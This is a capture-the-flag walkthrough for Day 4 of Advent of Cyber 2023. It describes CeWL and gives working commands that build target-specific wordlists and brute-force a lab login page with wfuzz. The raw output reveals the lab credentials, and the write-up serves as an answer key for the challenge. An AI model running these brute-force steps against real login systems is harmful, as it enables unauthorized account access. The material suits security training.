# Day 4

![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/87565812-f06a-4f09-8433-01c6148f9d83)

## CeWL: Custom Wordlist Generator

Many tools rely on pre-defined lists or common dictionary attacks, but CeWL stands out for the following reasons:

      1. **Target-specific wordlists:**
         - CeWL crafts wordlists specifically from the content of a targeted website. The generated list is tailored to the vocabulary and terminology used on that site, increasing the efficiency of brute-forcing tasks.
      
      2. **Depth of search:**
         - CeWL can spider a website to a specified depth, extracting words not just from one page but also from linked pages up to the set depth.
      
      3. **Customizable outputs:**
         - CeWL provides various options to fine-tune the wordlist, such as setting a minimum word length, removing numbers, and including meta tags. This customization is advantageous for targeting specific types of credentials or vulnerabilities.
      
      4. **Built-in features:**
         - While its primary purpose is wordlist generation, CeWL includes functionalities such as username enumeration from author meta tags and email extraction.
      
      5. **Efficiency:**
         - Given its customizability, CeWL can often generate shorter but more relevant word lists than generic ones, making password attacks quicker and more precise.
      
      6. **Integration with other tools:**
         - Being command-line based, CeWL can be seamlessly integrated into automated workflows, and its outputs can be directly fed into other cybersecurity tools.
      
      7. **Actively maintained:**
         - CeWL is actively maintained and updated, staying relevant and compatible with contemporary security needs and challenges.


## Day 4 Task:

### 1. What is the correct username and password combination? Format username: password

With CewlGenerate a list of Usernames with the Command —

    cewl -d 0 -m 5 -w usernames.txt http://MACHINE-IP/team.php — lowercase
   
Again with CewlGenerate a list of Passwords with the Command —

    cewl -d 2 -m 5 -w passwords.txt http://MACHINE-IP —-with-numbers
   
Now bruteforce the Credentials using wfuzz with the command —

    wfuzz -c -z file,usernames.txt -z file,passwords.txt — hs “Please enter the correct credentials” -u http://MACHINE-IP/login.php -d “username=FUZZ&password=FUZ2Z”

```
╰─ wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.1.59/login.php -d "username=FUZZ&password=FUZ2Z"      ─╯

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.1.59/login.php
Total requests: 9324

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                     
=====================================================================

000006292:   302        118 L    297 W      4442 Ch     "isaias - Happiness"                                                                                        

Total time: 0
Processed Requests: 9324
Filtered Requests: 9323
Requests/sec.: 0


```

### 2. What is the Flag?

Log in and click on the Email with the Subject “Confidential Message”

